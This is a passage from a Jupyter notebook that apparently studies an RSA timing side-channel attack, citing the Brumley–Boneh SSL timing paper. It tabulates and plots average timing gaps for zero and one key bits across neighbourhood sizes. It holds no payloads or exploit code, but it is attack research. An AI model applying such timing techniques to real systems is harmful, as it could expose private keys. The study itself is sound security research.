    "    df['Neighbourhood Size'].append(neighbourhood_size)\n",
    "    df['Zero Gap'].append(zero_gaps.mean())\n",
    "    df['One Gap'].append(one_gaps.mean())\n",
    "    \n",
    "df = pandas.DataFrame(df)\n",
    "df"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "With the exception of `neighbourhood_size=1`, the average one gap is always less than the average zero gap. This is a good sign, I think. It shows that the gaps display the behaviour we need as a population, even though the individual variance is too high to identify indivudal bits."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f7acc92b990>"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "df_plot = {\n",
    "    'Neighbourhood Size': [],\n",
    "    'Average Gap': [],\n",
    "    'Bit Value': [],\n",
    "}\n",
    "\n",
    "for _, row in df[df['Neighbourhood Size'] != 1].iterrows():\n",
    "    df_plot['Neighbourhood Size'].append(row['Neighbourhood Size'])\n",
    "    df_plot['Average Gap'].append(row['Zero Gap'])\n",
    "    df_plot['Bit Value'].append(0)\n",
    "    \n",
    "    df_plot['Neighbourhood Size'].append(row['Neighbourhood Size'])\n",
    "    df_plot['Average Gap'].append(row['One Gap'])\n",
    "    df_plot['Bit Value'].append(1)\n",
    "\n",
    "\n",
    "seaborn.lineplot(data=pandas.DataFrame(df_plot), x='Neighbourhood Size', y='Average Gap', hue='Bit Value')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Increasing the neighbourhood size decreases average gap for both zero bits and one bits. Further, it doesn't seem to have increased the distance between te average gaps. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(3014.622947700105, 2442.2953081129563)"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Zero Gap'][1:].mean(), df['One Gap'][1:].mean()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Coppersmiths Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## References\n",
    "  - [1] https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
